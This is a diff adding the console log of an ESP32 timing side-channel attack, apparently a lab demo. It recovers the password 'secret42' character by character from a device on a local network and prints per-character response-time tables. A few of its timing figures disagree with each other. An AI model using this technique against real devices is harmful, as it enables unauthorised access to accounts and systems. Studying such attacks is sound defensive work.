@@ -1,0 +1,146 @@
+ESP32 Precise Timing Side-Channel Attack
+---------------------------------------
+Connecting to WiFi....
+Connected to WiFi
+IP address: 192.168.253.100
+Target IP: 192.168.253.22:4210
+Starting attack...
+
+
+Current guess: []
+Finding character at position 0...
+Baseline response time: 1850 μs
+
+Timing analysis for position 0:
+----------------------------------------------
+Char | Avg Time (μs) | Min | Max | StdDev | Samples
+----------------------------------------------
+ a   | 1835 | 1720 | 1930 | 28.1 | 30
+ b   | 1800 | 1705 | 1890 | 27.4 | 30
+ ...
+ s   | 2600 | 2480 | 2710 | 25.0 | 30
+ ...
+ z   | 1780 | 1680 | 1850 | 22.6 | 30
+
+Best character: 's' with avg time 2600 μs  
+Second best time: 1835 μs  
+Difference factor: 1.41  
+Expected time for this position: ~2350 μs
+
+✓ CONFIRMED CHARACTER: 's'  
+Password so far: [s]
+
+
+Current guess: [s]
+Finding character at position 1...
+Baseline response time: 1950 μs
+
+Timing analysis for position 1:
+----------------------------------------------
+ ...
+ e   | 2745 | 2640 | 2850 | 30.5 | 30
+ ...
+ r   | 1910 | 1750 | 2020 | 31.0 | 30
+
+Best character: 'e' with avg time 2745 μs  
+Second best time: 1910 μs  
+Difference factor: 1.44  
+Expected time for this position: ~2850 μs
+
+✓ CONFIRMED CHARACTER: 'e'  
+Password so far: [se]
+
+
+Current guess: [se]
+Finding character at position 2...
+Baseline response time: 2100 μs
+
+Timing analysis for position 2:
+----------------------------------------------
+ ...
+ c   | 3010 | 2920 | 3110 | 20.2 | 30
+ ...
+ t   | 2080 | 1950 | 2190 | 28.1 | 30
+
+Best character: 'c' with avg time 3010 μs  
+Second best time: 2100 μs  
+Difference factor: 1.43  
+Expected time for this position: ~3200 μs
+
+✓ CONFIRMED CHARACTER: 'c'  
+Password so far: [sec]
+
+
+Current guess: [sec]
+Finding character at position 3...
+Baseline response time: 2350 μs
+
+...
+ r   | 3400 | 3320 | 3490 | 18.0 | 30
+ ...
+
+✓ CONFIRMED CHARACTER: 'r'  
+Password so far: [secr]
+
+
+Current guess: [secr]
+Finding character at position 4...
+Baseline response time: 2550 μs
+
+...
+ e   | 3650 | 3550 | 3750 | 21.0 | 30
+ ...
+
+✓ CONFIRMED CHARACTER: 'e'  
+Password so far: [secre]
+
+
+Current guess: [secre]
+Finding character at position 5...
+Baseline response time: 2850 μs
+
+...
+ t   | 3900 | 3790 | 4020 | 23.0 | 30
+ ...
+
+✓ CONFIRMED CHARACTER: 't'  
+Password so far: [secret]
+
+
+Current guess: [secret]
+Finding character at position 6...
+Baseline response time: 3100 μs
+
+...
+ 4   | 4150 | 4050 | 4250 | 20.0 | 30
+ ...
+
+✓ CONFIRMED CHARACTER: '4'  
+Password so far: [secret4]
+
+
+Current guess: [secret4]
+Finding character at position 7...
+Baseline response time: 3300 μs
+
+...
+ 2   | 4350 | 4220 | 4450 | 18.5 | 30
+ ...
+
+✓ CONFIRMED CHARACTER: '2'  
+Password so far: [secret42]
+
+⚠️ Password might be complete - response time dropped significantly.
+
+Retrying position 8...
+Baseline response time: 1800 μs  
+No clear winner - difference between candidates too small.
+
+Retrying position 8...
+No clear winner...
+
+...
+
+Attack finished or stalled at position 8.
+Final guess: [secret42]
+out
